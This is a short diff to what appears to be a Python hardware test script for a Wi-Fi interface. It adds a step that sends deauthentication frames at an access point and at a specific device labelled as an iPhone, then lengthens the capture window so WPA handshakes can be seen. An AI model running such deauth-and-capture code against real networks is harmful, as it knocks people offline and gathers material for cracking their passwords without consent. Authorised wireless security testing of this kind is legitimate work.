@@ -35,9 +35,16 @@ async def test_hw():
         print("[+] Successfully tuned to Channel 1!")
     else:
         print("[-] Failed to tune to Channel 1.")
+        
+    print("[*] Waiting 2 seconds to gather targets...")
+    await asyncio.sleep(2)
+    
+    print("[*] Firing Deauth test...")
+    # Using the specific AP and iPhone MACs
+    await iface.deauth("aa:bb:cc:dd:ee:01", "04:2E:C1:51:43:B8")
 
-    print("[*] Waiting 5 seconds to observe traffic...")
-    await asyncio.sleep(5)
+    print("[*] Waiting 15 seconds to observe traffic (look for handshakes!)...")
+    await asyncio.sleep(15)
 
     print("[*] Closing interface...")
     await iface.close()
